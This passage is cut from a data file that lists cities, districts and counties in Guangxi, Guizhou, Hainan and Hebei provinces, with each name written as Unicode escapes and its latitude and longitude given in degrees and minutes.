["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5408\u5C71\u5E02", "23", "49", "108", "52"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5B9C\u5DDE\u5E02", "24", "30", "108", "40"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6842\u5E73\u5E02", "23", "24", "110", "5"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5C91\u6EAA\u5E02", "22", "55", "110", "59"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5317\u6D41\u5E02", "22", "43", "110", "21"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9756\u897F\u53BF", "23", "8", "106", "25"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5929\u7B49\u53BF", "23", "5", "107", "8"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9F99\u5DDE\u53BF", "22", "21", "106", "51"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5B81\u660E\u53BF", "22", "8", "107", "4"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5408\u6D66\u53BF", "21", "40", "109", "12"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u535A\u767D\u53BF", "22", "17", "109", "58"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6D66\u5317\u53BF", "22", "16", "109", "33"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7075\u5C71\u53BF", "22", "26", "109", "18"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6A2A\u53BF", "22", "41", "109", "16"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5174\u4E1A\u53BF", "22", "45", "109", "52"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5BBE\u9633\u53BF", "23", "13", "108", "48"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6B66\u9E23\u53BF", "23", "10", "108", "16"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6276\u7EE5\u53BF", "22", "38", "107", "54"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E0A\u601D\u53BF", "22", "9", "107", "59"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5927\u65B0\u53BF", "22", "50", "107", "12"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9686\u5B89\u53BF", "23", "11", "107", "41"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5E73\u679C\u53BF", "23", "19", "107", "35"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5DF4\u9A6C\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "9", "107", "15"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E1C\u5170\u53BF", "24", "31", "107", "22"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u90FD\u5B89\u7476\u65CF\u81EA\u6CBB\u53BF", "23", "56", "108", "6"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5927\u5316\u7476\u65CF\u81EA\u6CBB\u53BF", "23", "44", "107", "59"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9A6C\u5C71\u53BF", "23", "43", "108", "10"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E0A\u6797\u53BF", "23", "26", "108", "36"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6B66\u5BA3\u53BF", "23", "36", "109", "40"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8C61\u5DDE\u53BF", "23", "58", "109", "41"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u67F3\u6C5F\u53BF", "24", "16", "109", "20"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9E7F\u5BE8\u53BF", "24", "29", "109", "44"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5FFB\u57CE\u53BF", "24", "4", "108", "40"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7F57\u57CE\u4EEB\u4F6C\u65CF\u81EA\u6CBB\u53BF", "24", "47", "108", "54"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u878D\u6C34\u82D7\u65CF\u81EA\u6CBB\u53BF", "25", "4", "109", "15"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u878D\u5B89\u53BF", "25", "14", "109", "24"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u67F3\u57CE\u53BF", "24", "39", "109", "14"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6C38\u798F\u53BF", "24", "59", "109", "59"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E09\u6C5F\u4F97\u65CF\u81EA\u6CBB\u53BF", "25", "47", "109", "36"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4ECE\u6C5F\u53BF", "25", "45", "108", "54"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u73AF\u6C5F\u6BDB\u5357\u65CF\u81EA\u6CBB\u53BF", "24", "50", "108", "15"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5357\u4E39\u53BF", "24", "59", "107", "32"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E50\u4E1A\u53BF", "24", "47", "106", "33"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5929\u5CE8\u53BF", "24", "60", "107", "10"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u51E4\u5C71\u53BF", "24", "33", "107", "3"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u51CC\u4E91\u53BF", "24", "21", "106", "34"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7530\u9633\u53BF", "23", "44", "106", "55"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7530\u4E1C\u53BF", "23", "36", "107", "7"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5FB7\u4FDD\u53BF", "23", "20", "106", "37"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u90A3\u5761\u53BF", "23", "25", "105", "50"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7530\u6797\u53BF", "24", "18", "106", "14"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u897F\u6797\u53BF", "24", "30", "105", "6"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9686\u6797\u5404\u65CF\u81EA\u6CBB\u53BF", "24", "46", "105", "20"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5168\u5DDE\u53BF", "25", "56", "111", "4"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u704C\u9633\u53BF", "25", "29", "111", "9"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5174\u5B89\u53BF", "25", "37", "110", "40"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8D44\u6E90\u53BF", "26", "2", "110", "38"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9F99\u80DC\u5404\u65CF\u81EA\u6CBB\u53BF", "25", "48", "110", "0"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7075\u5DDD\u53BF", "25", "25", "110", "19"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E34\u6842\u53BF", "25", "14", "110", "12"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9633\u6714\u53BF", "24", "47", "110", "29"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5E73\u4E50\u53BF", "24", "38", "110", "38"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u606D\u57CE\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "50", "110", "50"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5BCC\u5DDD\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "50", "111", "16"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u949F\u5C71\u53BF", "24", "32", "111", "18"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u662D\u5E73\u53BF", "24", "10", "110", "48"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8354\u6D66\u53BF", "24", "30", "110", "23"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u91D1\u79C0\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "8", "110", "11"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8499\u5C71\u53BF", "24", "12", "110", "31"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5E73\u5357\u53BF", "23", "33", "110", "23"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u85E4\u53BF", "23", "23", "110", "55"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u82CD\u68A7\u53BF", "23", "25", "111", "14"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5BB9\u53BF", "22", "52", "110", "33"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9646\u5DDD\u53BF", "22", "20", "110", "16"], ["\u8D35\u5DDE\u7701", "\u8D35\u9633\u5E02", "26", "39", "106", "38"], ["\u8D35\u5DDE\u7701", "\u9ED4\u897F\u5357\u5E03\u4F9D\u65CF\u82D7\u65CF\u81EA\u6CBB\u5DDE", "25", "5", "104", "54"], ["\u8D35\u5DDE\u7701", "\u516D\u76D8\u6C34\u5E02", "26", "36", "104", "50"], ["\u8D35\u5DDE\u7701", "\u6BD5\u8282\u5730\u533A", "27", "18", "105", "17"], ["\u8D35\u5DDE\u7701", "\u5B89\u987A\u5E02", "26", "15", "105", "57"], ["\u8D35\u5DDE\u7701", "\u9ED4\u4E1C\u5357\u82D7\u65CF\u4F97\u65CF\u81EA\u6CBB\u5DDE", "26", "35", "107", "58"], ["\u8D35\u5DDE\u7701", "\u9ED4\u5357\u5E03\u4F9D\u65CF\u82D7\u65CF\u81EA\u6CBB\u5DDE", "26", "16", "107", "31"], ["\u8D35\u5DDE\u7701", "\u9075\u4E49\u5E02", "27", "44", "106", "55"], ["\u8D35\u5DDE\u7701", "\u94DC\u4EC1\u5730\u533A", "27", "43", "109", "11"], ["\u8D35\u5DDE\u7701", "\u767D\u4E91\u533A", "26", "41", "106", "39"], ["\u8D35\u5DDE\u7701", "\u7389\u5C4F\u4F97\u65CF\u81EA\u6CBB\u53BF", "27", "14", "108", "55"], ["\u8D35\u5DDE\u7701", "\u4ECE\u6C5F\u53BF", "25", "45", "108", "54"], ["\u8D35\u5DDE\u7701", "\u897F\u79C0\u533A", "26", "15", "105", "55"], ["\u8D35\u5DDE\u7701", "\u5C0F\u6CB3\u533A", "26", "32", "106", "42"], ["\u8D35\u5DDE\u7701", "\u5357\u660E\u533A", "26", "34", "106", "43"], ["\u8D35\u5DDE\u7701", "\u4E91\u5CA9\u533A", "26", "37", "106", "43"], ["\u8D35\u5DDE\u7701", "\u4E4C\u5F53\u533A", "26", "38", "106", "45"], ["\u8D35\u5DDE\u7701", "\u8D64\u6C34\u5E02", "28", "35", "105", "42"], ["\u8D35\u5DDE\u7701", "\u7EA2\u82B1\u5C97\u533A", "27", "39", "106", "55"], ["\u8D35\u5DDE\u7701", "\u6C47\u5DDD\u533A", "27", "44", "106", "55"], ["\u8D35\u5DDE\u7701", "\u949F\u5C71\u533A", "26", "36", "104", "50"], ["\u8D35\u5DDE\u7701", "\u5174\u4E49\u5E02", "25", "5", "104", "54"], ["\u8D35\u5DDE\u7701", "\u6BD5\u8282\u5E02", "27", "18", "105", "17"], ["\u8D35\u5DDE\u7701", "\u51EF\u91CC\u5E02", "26", "35", "107", "58"], ["\u8D35\u5DDE\u7701", "\u798F\u6CC9\u5E02", "26", "42", "107", "30"], ["\u8D35\u5DDE\u7701", "\u90FD\u5300\u5E02", "26", "16", "107", "31"], ["\u8D35\u5DDE\u7701", "\u6E05\u9547\u5E02", "26", "33", "106", "28"], ["\u8D35\u5DDE\u7701", "\u94DC\u4EC1\u5E02", "27", "43", "109", "11"], ["\u8D35\u5DDE\u7701", "\u4EC1\u6000\u5E02", "27", "49", "106", "25"], ["\u8D35\u5DDE\u7701", "\u76D8\u53BF", "25", "43", "104", "28"], ["\u8D35\u5DDE\u7701", "\u666E\u5B89\u53BF", "25", "47", "104", "57"], ["\u8D35\u5DDE\u7701", "\u5A01\u5B81\u5F5D\u65CF\u56DE\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "26", "52", "104", "17"], ["\u8D35\u5DDE\u7701", "\u8D6B\u7AE0\u53BF", "27", "8", "104", "43"], ["\u8D35\u5DDE\u7701", "\u516D\u679D\u7279\u533A", "26", "13", "105", "29"], ["\u8D35\u5DDE\u7701", "\u7EB3\u96CD\u53BF", "26", "47", "105", "23"], ["\u8D35\u5DDE\u7701", "\u6C34\u57CE\u53BF", "26", "33", "104", "57"], ["\u8D35\u5DDE\u7701", "\u5927\u65B9\u53BF", "27", "9", "105", "36"], ["\u8D35\u5DDE\u7701", "\u9ED4\u897F\u53BF", "27", "2", "106", "2"], ["\u8D35\u5DDE\u7701", "\u91D1\u6C99\u53BF", "27", "28", "106", "13"], ["\u8D35\u5DDE\u7701", "\u7EC7\u91D1\u53BF", "26", "40", "105", "46"], ["\u8D35\u5DDE\u7701", "\u666E\u5B9A\u53BF", "26", "19", "105", "45"], ["\u8D35\u5DDE\u7701", "\u9547\u5B81\u5E03\u4F9D\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "26", "4", "105", "46"], ["\u8D35\u5DDE\u7701", "\u5E73\u575D\u53BF", "26", "25", "106", "15"], ["\u8D35\u5DDE\u7701", "\u7D2B\u4E91\u82D7\u65CF\u5E03\u4F9D\u65CF\u81EA\u6CBB\u53BF", "25", "45", "106", "5"], ["\u8D35\u5DDE\u7701", "\u5173\u5CAD\u5E03\u4F9D\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "25", "57", "105", "37"], ["\u8D35\u5DDE\u7701", "\u6674\u9686\u53BF", "25", "50", "105", "13"], ["\u8D35\u5DDE\u7701", "\u8D1E\u4E30\u53BF", "25", "23", "105", "39"], ["\u8D35\u5DDE\u7701", "\u5174\u4EC1\u53BF", "25", "26", "105", "11"], ["\u8D35\u5DDE\u7701", "\u5B89\u9F99\u53BF", "25", "7", "105", "28"], ["\u8D35\u5DDE\u7701", "\u518C\u4EA8\u53BF", "24", "59", "105", "49"], ["\u8D35\u5DDE\u7701", "\u671B\u8C1F\u53BF", "25", "10", "106", "6"], ["\u8D35\u5DDE\u7701", "\u7F57\u7538\u53BF", "25", "26", "106", "45"], ["\u8D35\u5DDE\u7701", "\u957F\u987A\u53BF", "26", "2", "106", "27"], ["\u8D35\u5DDE\u7701", "\u5E73\u5858\u53BF", "25", "50", "107", "19"], ["\u8D35\u5DDE\u7701", "\u72EC\u5C71\u53BF", "25", "50", "107", "32"], ["\u8D35\u5DDE\u7701", "\u6995\u6C5F\u53BF", "25", "56", "108", "31"], ["\u8D35\u5DDE\u7701", "\u8354\u6CE2\u53BF", "25", "25", "107", "53"], ["\u8D35\u5DDE\u7701", "\u4E09\u90FD\u6C34\u65CF\u81EA\u6CBB\u53BF", "25", "59", "107", "52"], ["\u8D35\u5DDE\u7701", "\u96F7\u5C71\u53BF", "26", "23", "108", "4"], ["\u8D35\u5DDE\u7701", "\u53F0\u6C5F\u53BF", "26", "40", "108", "19"], ["\u8D35\u5DDE\u7701", "\u5251\u6CB3\u53BF", "26", "44", "108", "27"], ["\u8D35\u5DDE\u7701", "\u9ECE\u5E73\u53BF", "26", "14", "109", "8"], ["\u8D35\u5DDE\u7701", "\u4E09\u7A57\u53BF", "26", "58", "108", "41"], ["\u8D35\u5DDE\u7701", "\u9526\u5C4F\u53BF", "26", "41", "109", "12"], ["\u8D35\u5DDE\u7701", "\u5929\u67F1\u53BF", "26", "55", "109", "12"], ["\u8D35\u5DDE\u7701", "\u5C91\u5DE9\u53BF", "27", "11", "108", "49"], ["\u8D35\u5DDE\u7701", "\u9547\u8FDC\u53BF", "27", "3", "108", "25"], ["\u8D35\u5DDE\u7701", "\u65BD\u79C9\u53BF", "27", "2", "108", "7"], ["\u8D35\u5DDE\u7701", "\u9EC4\u5E73\u53BF", "26", "54", "107", "54"], ["\u8D35\u5DDE\u7701", "\u4F59\u5E86\u53BF", "27", "13", "107", "53"], ["\u8D35\u5DDE\u7701", "\u74EE\u5B89\u53BF", "27", "4", "107", "28"], ["\u8D35\u5DDE\u7701", "\u4E39\u5BE8\u53BF", "26", "12", "107", "48"], ["\u8D35\u5DDE\u7701", "\u9EBB\u6C5F\u53BF", "26", "30", "107", "35"], ["\u8D35\u5DDE\u7701", "\u8D35\u5B9A\u53BF", "26", "35", "107", "14"], ["\u8D35\u5DDE\u7701", "\u9F99\u91CC\u53BF", "26", "27", "106", "58"], ["\u8D35\u5DDE\u7701", "\u60E0\u6C34\u53BF", "26", "8", "106", "39"], ["\u8D35\u5DDE\u7701", "\u4FEE\u6587\u53BF", "26", "50", "106", "35"], ["\u8D35\u5DDE\u7701", "\u606F\u70FD\u53BF", "27", "6", "106", "44"], ["\u8D35\u5DDE\u7701", "\u5F00\u9633\u53BF", "27", "4", "106", "58"], ["\u8D35\u5DDE\u7701", "\u9075\u4E49\u53BF", "27", "32", "106", "50"], ["\u8D35\u5DDE\u7701", "\u6850\u6893\u53BF", "28", "8", "106", "49"], ["\u8D35\u5DDE\u7701", "\u6B63\u5B89\u53BF", "28", "33", "107", "26"], ["\u8D35\u5DDE\u7701", "\u9053\u771F\u4EE1\u4F6C\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "28", "53", "107", "36"], ["\u8D35\u5DDE\u7701", "\u51E4\u5188\u53BF", "27", "58", "107", "43"], ["\u8D35\u5DDE\u7701", "\u7EE5\u9633\u53BF", "27", "57", "107", "11"], ["\u8D35\u5DDE\u7701", "\u6E44\u6F6D\u53BF", "27", "46", "107", "29"], ["\u8D35\u5DDE\u7701", "\u601D\u5357\u53BF", "27", "56", "108", "15"], ["\u8D35\u5DDE\u7701", "\u5370\u6C5F\u571F\u5BB6\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "27", "60", "108", "24"], ["\u8D35\u5DDE\u7701", "\u77F3\u9621\u53BF", "27", "31", "108", "14"], ["\u8D35\u5DDE\u7701", "\u6C5F\u53E3\u53BF", "27", "42", "108", "51"], ["\u8D35\u5DDE\u7701", "\u4E07\u5C71\u7279\u533A", "27", "31", "109", "12"], ["\u8D35\u5DDE\u7701", "\u6CBF\u6CB3\u571F\u5BB6\u65CF\u81EA\u6CBB\u53BF", "28", "34", "108", "30"], ["\u8D35\u5DDE\u7701", "\u677E\u6843\u82D7\u65CF\u81EA\u6CBB\u53BF", "28", "10", "109", "12"], ["\u8D35\u5DDE\u7701", "\u5FB7\u6C5F\u53BF", "28", "16", "108", "7"], ["\u8D35\u5DDE\u7701", "\u52A1\u5DDD\u4EE1\u4F6C\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "28", "32", "107", "53"], ["\u8D35\u5DDE\u7701", "\u4E60\u6C34\u53BF", "28", "19", "106", "13"], ["\u6D77\u5357\u7701", "\u6D77\u53E3\u5E02", "20", "2", "110", "19"], ["\u6D77\u5357\u7701", "\u4E09\u4E9A\u5E02", "18", "15", "109", "30"], ["\u6D77\u5357\u7701", "\u9F99\u534E\u533A", "20", "2", "110", "18"], ["\u6D77\u5357\u7701", "\u79C0\u82F1\u533A", "20", "1", "110", "17"], ["\u6D77\u5357\u7701", "\u743C\u5C71\u533A", "20", "0", "110", "21"], ["\u6D77\u5357\u7701", "\u7F8E\u5170\u533A", "20", "2", "110", "22"], ["\u6D77\u5357\u7701", "\u4E1C\u65B9\u5E02", "19", "6", "108", "38"], ["\u6D77\u5357\u7701", "\u4E94\u6307\u5C71\u5E02", "18", "47", "109", "31"], ["\u6D77\u5357\u7701", "\u743C\u6D77\u5E02", "19", "15", "110", "28"], ["\u6D77\u5357\u7701", "\u4E07\u5B81\u5E02", "18", "48", "110", "24"], ["\u6D77\u5357\u7701", "\u6587\u660C\u5E02", "19", "33", "110", "48"], ["\u6D77\u5357\u7701", "\u510B\u5DDE\u5E02", "19", "31", "109", "34"], ["\u6D77\u5357\u7701", "\u4E50\u4E1C\u9ECE\u65CF\u81EA\u6CBB\u53BF", "18", "45", "109", "10"], ["\u6D77\u5357\u7701", "\u660C\u6C5F\u9ECE\u65CF\u81EA\u6CBB\u53BF", "19", "15", "109", "3"], ["\u6D77\u5357\u7701", "\u767D\u6C99\u9ECE\u65CF\u81EA\u6CBB\u53BF", "19", "14", "109", "27"], ["\u6D77\u5357\u7701", "\u743C\u4E2D\u9ECE\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "19", "2", "109", "50"], ["\u6D77\u5357\u7701", "\u4FDD\u4EAD\u9ECE\u65CF\u82D7\u65CF\u81EA\u6CBB\u53BF", "18", "38", "109", "42"], ["\u6D77\u5357\u7701", "\u9675\u6C34\u9ECE\u65CF\u81EA\u6CBB\u53BF", "18", "30", "110", "2"], ["\u6D77\u5357\u7701", "\u5C6F\u660C\u53BF", "19", "22", "110", "6"], ["\u6D77\u5357\u7701", "\u6F84\u8FC8\u53BF", "19", "44", "110", "0"], ["\u6D77\u5357\u7701", "\u5B9A\u5B89\u53BF", "19", "42", "110", "19"], ["\u6D77\u5357\u7701", "\u4E34\u9AD8\u53BF", "19", "55", "109", "41"], ["\u6CB3\u5317\u7701", "\u77F3\u5BB6\u5E84\u5E02", "38", "3", "114", "31"], ["\u6CB3\u5317\u7701", "\u90AF\u90F8\u5E02", "36", "37", "114", "29"], ["\u6CB3\u5317\u7701", "\u90A2\u53F0\u5E02", "37", "4", "114", "29"], ["\u6CB3\u5317\u7701", "\u4FDD\u5B9A\u5E02", "38", "52", "115", "28"], ["\u6CB3\u5317\u7701", "\u8861\u6C34\u5E02", "37", "44", "115", "41"], ["\u6CB3\u5317\u7701", "\u6CA7\u5DDE\u5E02", "38", "18", "116", "50"], ["\u6CB3\u5317\u7701", "\u5ECA\u574A\u5E02", "39", "31", "116", "42"], ["\u6CB3\u5317\u7701", "\u5510\u5C71\u5E02", "39", "38", "118", "12"], ["\u6CB3\u5317\u7701", "\u627F\u5FB7\u5E02", "40", "58", "117", "56"], ["\u6CB3\u5317\u7701", "\u5F20\u5BB6\u53E3\u5E02", "40", "49", "114", "53"], ["\u6CB3\u5317\u7701", "\u79E6\u7687\u5C9B\u5E02", "39", "56", "119", "36"], ["\u6CB3\u5317\u7701", "\u4E09\u6CB3\u5E02", "39", "59", "117", "4"], ["\u6CB3\u5317\u7701", "\u53E4\u51B6\u533A", "39", "44", "118", "25"], ["\u6CB3\u5317\u7701", "\u5F00\u5E73\u533A", "39", "41", "118", "16"], ["\u6CB3\u5317\u7701", "\u4E30\u6DA6\u533A", "39", "50", "118", "10"], ["\u6CB3\u5317\u7701", "\u8DEF\u5317\u533A", "39", "38", "118", "13"], ["\u6CB3\u5317\u7701", "\u8DEF\u5357\u533A", "39", "38", "118", "10"], ["\u6CB3\u5317\u7701", "\u4E30\u5357\u533A", "39", "34", "118", "6"], ["\u6CB3\u5317\u7701", "\u5CF0\u5CF0\u77FF\u533A", "36", "25", "114", "12"], ["\u6CB3\u5317\u7701", "\u4E95\u9649\u77FF\u533A", "38", "5", "114", "3"], ["\u6CB3\u5317\u7701", "\u6865\u897F\u533A", "38", "2", "114", "28"], ["\u6CB3\u5317\u7701", "\u88D5\u534E\u533A", "38", "1", "114", "31"], ["\u6CB3\u5317\u7701", "\u957F\u5B89\u533A", "38", "3", "114", "31"], ["\u6CB3\u5317\u7701", "\u6865\u4E1C\u533A", "38", "3", "114", "30"], ["\u6CB3\u5317\u7701", "\u65B0\u534E\u533A", "38", "3", "114", "28"], ["\u6CB3\u5317\u7701", "\u6843\u57CE\u533A", "37", "44", "115", "41"], ["\u6CB3\u5317\u7701", "\u5E7F\u9633\u533A", "39", "32", "116", "43"], ["\u6CB3\u5317\u7701", "\u5B89\u6B21\u533A", "39", "31", "116", "41"], ["\u6CB3\u5317\u7701", "\u65B0\u5E02\u533A", "38", "52", "115", "27"], ["\u6CB3\u5317\u7701", "\u5357\u5E02\u533A", "38", "51", "115", "30"], ["\u6CB3\u5317\u7701", "\u5317\u5E02\u533A", "38", "52", "115", "29"], ["\u6CB3\u5317\u7701", "\u4E0B\u82B1\u56ED\u533A", "40", "29", "115", "16"], ["\u6CB3\u5317\u7701", "\u5BA3\u5316\u533A", "40", "36", "115", "3"], ["\u6CB3\u5317\u7701", "\u6865\u4E1C\u533A", "40", "47", "114", "54"], ["\u6CB3\u5317\u7701", "\u6865\u897F\u533A", "40", "50", "114", "52"], ["\u6CB3\u5317\u7701", "\u53CC\u6865\u533A", "40", "58", "117", "56"], ["\u6CB3\u5317\u7701", "\u53CC\u6EE6\u533A", "40", "57", "117", "47"], ["\u6CB3\u5317\u7701", "\u9E70\u624B\u8425\u5B50\u77FF\u533A", "40", "33", "117", "39"], ["\u6CB3\u5317\u7701", "\u5C71\u6D77\u5173\u533A", "40", "0", "119", "46"], ["\u6CB3\u5317\u7701", "\u6D77\u6E2F\u533A", "39", "56", "119", "36"], ["\u6CB3\u5317\u7701", "\u5317\u6234\u6CB3\u533A", "39", "50", "119", "29"], ["\u6CB3\u5317\u7701", "\u6B66\u5B89\u5E02", "36", "42", "114", "12"], ["\u6CB3\u5317\u7701", "\u6C99\u6CB3\u5E02", "36", "51", "114", "30"], ["\u6CB3\u5317\u7701", "\u65B0\u4E50\u5E02", "38", "21", "114", "41"], ["\u6CB3\u5317\u7701", "\u85C1\u57CE\u5E02", "38", "2", "114", "50"], ["\u6CB3\u5317\u7701", "\u9E7F\u6CC9\u5E02", "38", "5", "114", "18"], ["\u6CB3\u5317\u7701", "\u5180\u5DDE\u5E02", "37", "34", "115", "34"], ["\u6CB3\u5317\u7701", "\u6DF1\u5DDE\u5E02", "38", "1", "115", "33"], ["\u6CB3\u5317\u7701", "\u8F9B\u96C6\u5E02", "37", "55", "115", "13"], ["\u6CB3\u5317\u7701", "\u664B\u5DDE\u5E02", "38", "2", "115", "2"], ["\u6CB3\u5317\u7701", "\u5B9A\u5DDE\u5E02", "38", "31", "114", "58"], ["\u6CB3\u5317\u7701", "\u5B89\u56FD\u5E02", "38", "25", "115", "19"], ["\u6CB3\u5317\u7701", "\u4EFB\u4E18\u5E02", "38", "43", "116", "6"], ["\u6CB3\u5317\u7701", "\u6CB3\u95F4\u5E02", "38", "26", "116", "5"], ["\u6CB3\u5317\u7701", "\u4E34\u6E05\u5E02", "36", "50", "115", "42"], ["\u6CB3\u5317\u7701", "\u5357\u5BAB\u5E02", "37", "21", "115", "23"], ["\u6CB3\u5317\u7701", "\u9EC4\u9A85\u5E02", "38", "22", "117", "21"], ["\u6CB3\u5317\u7701", "\u6CCA\u5934\u5E02", "38", "4", "116", "34"], ["\u6CB3\u5317\u7701", "\u9738\u5DDE\u5E02", "39", "6", "116", "24"], ["\u6CB3\u5317\u7701", "\u8FC1\u5B89\u5E02", "40", "1", "118", "42"], ["\u6CB3\u5317\u7701", "\u9075\u5316\u5E02", "40", "11", "117", "57"], ["\u6CB3\u5317\u7701", "\u6DBF\u5DDE\u5E02", "39", "29", "115", "58"], ["\u6CB3\u5317\u7701", "\u9AD8\u7891\u5E97\u5E02", "39", "20", "115", "51"], ["\u6CB3\u5317\u7701", "\u9999\u6CB3\u53BF", "39", "46", "117", "0"], ["\u6CB3\u5317\u7701", "\u5927\u5382\u56DE\u65CF\u81EA\u6CBB\u53BF", "39", "53", "116", "59"], ["\u6CB3\u5317\u7701", "\u4E1B\u53F0\u533A", "36", "38", "114", "29"], ["\u6CB3\u5317\u7701", "\u90AF\u5C71\u533A", "36", "36", "114", "29"], ["\u6CB3\u5317\u7701", "\u590D\u5174\u533A", "36", "38", "114", "27"], ["\u6CB3\u5317\u7701", "\u6865\u4E1C\u533A", "37", "4", "114", "30"], ["\u6CB3\u5317\u7701", "\u6865\u897F\u533A", "37", "3", "114", "28"], ["\u6CB3\u5317\u7701", "\u8FD0\u6CB3\u533A", "38", "19", "116", "51"], ["\u6CB3\u5317\u7701", "\u65B0\u534E\u533A", "38", "19", "116", "52"], ["\u6CB3\u5317\u7701", "\u6D89\u53BF", "36", "34", "113", "40"], ["\u6CB3\u5317\u7701", 